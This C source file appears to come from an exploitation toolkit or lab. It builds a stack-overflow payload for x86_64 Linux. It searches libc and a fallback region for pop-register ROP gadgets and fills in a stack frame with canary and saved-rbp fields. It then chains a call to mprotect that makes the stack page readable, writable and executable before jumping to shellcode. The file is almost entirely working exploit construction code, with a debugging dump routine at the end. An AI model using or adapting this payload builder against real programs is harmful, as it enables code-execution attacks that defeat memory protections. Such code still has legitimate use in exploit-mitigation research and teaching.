#define _GNU_SOURCE
#include <assert.h>
#include <dlfcn.h>	// for dlsym()
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#include "payload.h"
#include "strnstr.h"

void initload(PayloadPtr plp) {
	memset(plp, 0, sizeof(*plp));
	initShellcodeUnion(&plp->pl_scu);
} // initload()

ssize_t makeload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr, char *p, ssize_t np) {
	size_t libc_size = getpagesize() * 100;	// Punt
	size_t fbg_size  = getpagesize() * 1;	// Punt

	// Gadgets as strings (x86_64)
	char s_popRDI[]	= {0x5f, 0xc3, 0};
	char s_popRSI[]	= {0x5e, 0xc3, 0};
	char s_popRDX[]	= {0x5a, 0xc3, 0};
	char s_nopNOP[]	= {0x90, 0xc3, 0};

	// First try to find gadgets libc
	Pointer	libc_popRDI	= strnstr(baseAddressesPtr->libc_base, s_popRDI, libc_size);
	Pointer	libc_popRSI	= strnstr(baseAddressesPtr->libc_base, s_popRSI, libc_size);
	Pointer	libc_popRDX	= strnstr(baseAddressesPtr->libc_base, s_popRDX, libc_size);

	// Next, get backup gadgets from fallbackGadgets()
	Pointer fbg_popRDI	= strnstr(baseAddressesPtr->fbg_base, s_popRDI, fbg_size);
	Pointer fbg_popRSI	= strnstr(baseAddressesPtr->fbg_base, s_popRSI, fbg_size);
	Pointer fbg_popRDX	= strnstr(baseAddressesPtr->fbg_base, s_popRDX, fbg_size);
	Pointer fbg_nopNOP	= strnstr(baseAddressesPtr->fbg_base, s_nopNOP, fbg_size);

	// Things are wrong if I don't find the gadgets in fallbackGadgets()
	assert(fbg_popRDI != NULL);
	assert(fbg_popRSI != NULL);
	assert(fbg_popRDX != NULL);
	assert(fbg_nopNOP != NULL); // This little guy is only found in fallbackGadgets()

	// We will need "mprotect()"
	Pointer	libc_mprotect	= dlsym(RTLD_NEXT, "mprotect");

	// Buffer offsets are relative to the payload
	baseAddressesPtr->buf_base = plp;

	// Payload Common
	PayloadCommonPtr pcp = &plp->pl_common;

	// Stack Frame
	StackFramePtr sfp = &pcp->pc_stackFrame;
	sfp->sf_dst.o		=	indirectToOffset(&sfp->sf_dst,			'B', baseAddressesPtr);
	sfp->sf_canary.o	=	indirectToOffset(&sfp->sf_canary,		'B', baseAddressesPtr);
	sfp->sf_rbp.o		=	indirectToOffset(&sfp->sf_rbp,			'B', baseAddressesPtr);

	// ROP Chain
	ROPChainPtr rcp = &pcp->pc_ROPChain;
	rcp->rc_popRDI.o	= libc_popRDI?
					pointerToOffset(libc_popRDI,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRDI,			'F', baseAddressesPtr);
	rcp->rc_stackPage.o	=	pointerToOffset(baseAddressesPtr->stack_base,	'S', baseAddressesPtr);
	rcp->rc_popRSI.o	= libc_popRSI?
					pointerToOffset(libc_popRSI,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRSI,			'F', baseAddressesPtr);
	rcp->rc_stackSize	=	getpagesize();
	rcp->rc_popRDX.o	= libc_popRDX?
					pointerToOffset(libc_popRDX,			'L', baseAddressesPtr):
					pointerToOffset(fbg_popRDX,			'F', baseAddressesPtr);
	rcp->rc_permission	=	0x7;
	rcp->rc_nop.o		=	pointerToOffset(fbg_nopNOP,			'F', baseAddressesPtr);
	rcp->rc_mprotect.o	=	pointerToOffset(libc_mprotect,			'L', baseAddressesPtr);

	// Stack pivot
	rcp->rc_shellCode.o	=	pointerToOffset(&plp->pl_scu,			'B', baseAddressesPtr);

	return makeShellcode(&plp->pl_scu.sc, p, np);
} // makeload()

static char *p8(void *s0, char *d) {
	char *s = (char *) s0;

	for (int i = 0; i < sizeof(Pointer); i++)
		d[i] = ((s[i] < ' ') || (s[i] > '~')) ? '.' : s[i];

	return d;
}

void dumpload(PayloadPtr plp, BaseAddressesPtr baseAddressesPtr) {
	char fmt[] = "%20s: %018p (\"%.8s\")\n";
	char d[sizeof(Pointer)];

	assert(sizeof(d) == 8);

	PayloadCommonPtr pcp = &plp->pl_common;
	StackFramePtr sfp = &pcp->pc_stackFrame;
	ROPChainPtr rcp = &pcp->pc_ROPChain;

	fprintf(stderr, "-----------------------------------------------------\n");
	fprintf(stderr, fmt, "sf_dst.p",        sfp->sf_dst.p,       p8(&sfp->sf_dst,        d));
	fprintf(stderr, fmt, "sf_canary.p",     sfp->sf_canary.p,    p8(&sfp->sf_canary,     d));
	fprintf(stderr, fmt, "sf_rbp.p",        sfp->sf_rbp.p,       p8(&sfp->sf_rbp,        d));

	fprintf(stderr, fmt, "rc_popRDI.p",     rcp->rc_popRDI.p,    p8(&rcp->rc_popRDI,     d));
	fprintf(stderr, fmt, "rc_stackPage.p",  rcp->rc_stackPage.p, p8(&rcp->rc_stackPage,  d));
	fprintf(stderr, fmt, "rc_popRSI.p",     rcp->rc_popRSI.p,    p8(&rcp->rc_popRSI,     d));
	fprintf(stderr, fmt, "rc_stackSize",    rcp->rc_stackSize,   p8(&rcp->rc_stackSize,  d));
	fprintf(stderr, fmt, "rc_popRDX.p",     rcp->rc_popRDX.p,    p8(&rcp->rc_popRDX,     d));
	fprintf(stderr, fmt, "rc_permission.p", rcp->rc_permission,  p8(&rcp->rc_permission, d));
	fprintf(stderr, fmt, "rc_noop.p",       rcp->rc_nop.p,       p8(&rcp->rc_nop,        d));
	fprintf(stderr, fmt, "rc_mprotect.p",   rcp->rc_mprotect.p,  p8(&rcp->rc_mprotect,   d));
	
	fprintf(stderr, fmt, "rc_shellCode.p",  rcp->rc_shellCode.p, p8(&rcp->rc_shellCode,  d));

	dumpShellcode(&plp->pl_scu.sc);
	fprintf(stderr, "-----------------------------------------------------\n");
} // dumpload()
